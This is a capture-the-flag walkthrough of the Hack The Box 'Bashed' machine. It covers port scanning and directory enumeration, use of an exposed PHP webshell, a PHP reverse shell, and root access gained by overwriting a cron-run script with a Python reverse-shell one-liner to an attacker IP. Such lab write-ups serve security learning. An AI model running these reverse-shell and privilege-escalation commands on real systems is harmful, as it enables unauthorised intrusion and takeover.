---
title: HTB-Bashed
date: "2020-04-29"
description: easy box on HTB with webserver and python vuln
tldr: box takeover with webshell and python
tags: [linux,webshell,python,htb]
---

## Information Gathering

IP address: `10.10.10.68`


## Scanning

```shell
$ nmap -sC -sV -oA nmap/bashed -p- -Pn -T4 10.10.10.68  
  
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-04-29 21:23 CEST  
Nmap scan report for 10.10.10.68  
Host is up (0.031s latency).  
Not shown: 65534 closed ports  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Arrexel's Development Site  
  
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 22.68 seconds
```


| Open ports |
|-------------|
| 80 |

## Enumeration 
A webpage was presented on port: `80` 
![htb-bashed-1](/img/htb-bashed-1.png)


### Gobuster
Some interesting folders were found with gobuster.

```shell
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://10.10.10.68](http://10.10.10.68)

===============================================================  
Gobuster v3.0.1  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)  
===============================================================  
[+] Url: [http://10.10.10.68](http://10.10.10.68)  
[+] Threads: 10  
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
[+] Status codes: 200,204,301,302,307,401,403  
[+] User Agent: gobuster/3.0.1  
[+] Timeout: 10s  
===============================================================  
2020/04/29 21:29:43 Starting gobuster  
===============================================================  
/images (Status: 301)  
/uploads (Status: 301)  
/php (Status: 301)  
/css (Status: 301)  
/dev (Status: 301)  
/js (Status: 301)  
/fonts (Status: 301)  
/server-status (Status: 403)  
===============================================================  
2020/04/29 21:40:54 Finished  
===============================================================
```

under the `/dev` folder there's a file called `phpbash.php` which is a webshell that we can use to our benefit.

Visit the webshell and see if we can get the contents of `user.txt`

```shell
www-data@bashed:/home/arrexel# cat user.txt  
2c281f318555dbc1b856957c7147bfc1
```

in order to get a reverse shell instead, lets set up a php-reverse shell.

```shell
kryssar@kali:/var/www/html$ sudo cp /usr/share/webshells/php/php-reverse-shell.php .  
mv php-reverse-shell.php phprev.php
```

Change the IP and necessary information to connect back to Kali on port 9443, then download the file (presented via apache/python on port 80) to the victim. 

![htb-bashed-2](/img/htb-bashed-2.png)

There were some issues with uploading it as `PHP` so instead upload it as `.txt` and then rename it on the target. Once it's renamed , try visiting the webpage from our Kali machine and see if the code executes more properly. 

```shell
kryssar@kali:/media/sf_PENTEST/HTB/bashed$ nc -nlvp 1234  
Ncat: Version 7.80 ( [https://nmap.org/ncat](https://nmap.org/ncat) )  
Ncat: Listening on :::1234  
Ncat: Listening on 0.0.0.0:1234  
Ncat: Connection from 10.10.10.68.  
Ncat: Connection from 10.10.10.68:37476.  
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  
13:36:58 up 1:11, 0 users, load average: 0.00, 0.00, 0.00  
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
/bin/sh: 0: can't access tty; job control turned off  
$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
$
```

Upgrade the shell so we get a proper prompt and some better handling.
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Once the shell is upgraded, it's time to check out the permissions on this ride.

```shell
www-data@bashed:/$ sudo -l  
Matching Defaults entries for www-data on bashed:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

It looks like we can run anything as the `scriptmananger` user, so lets try to use those permissions to our advantage. Perhaps send back a reverse shell ? 

under a folder called `scripts` there's an interesting file called `test.py` with the contents: 

```shell
scriptmanager@bashed:/scripts$ cat test.py  
f = open("test.txt", "w")  
f.write("testing 123!")  
f.close
```

Perhaps this file is run by the server every now and then ? lets use a trick from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to run a python reverse shell. 

```shell
echo -n "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.15\",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);" > test.py
```

Observe! character escaping is important (it was a source of some headache.)

once the test.py runs (it's on a timer and runs every minute, as long as there's a listener on our kali machine, the reverse shell will be sent out.)

```shell
Ncat: Version 7.80 ( [https://nmap.org/ncat](https://nmap.org/ncat) )  
Ncat: Listening on :::1235  
Ncat: Listening on 0.0.0.0:1235  
Ncat: Connection from 10.10.10.68.  
Ncat: Connection from 10.10.10.68:48516.  
bash: cannot set terminal process group (17527): Inappropriate ioctl for device  
bash: no job control in this shell  
root@bashed:/scripts# cd ~ && cat root.txt
cc4f0afe3a1026d402ba10329674a8e2
```


## EOF 
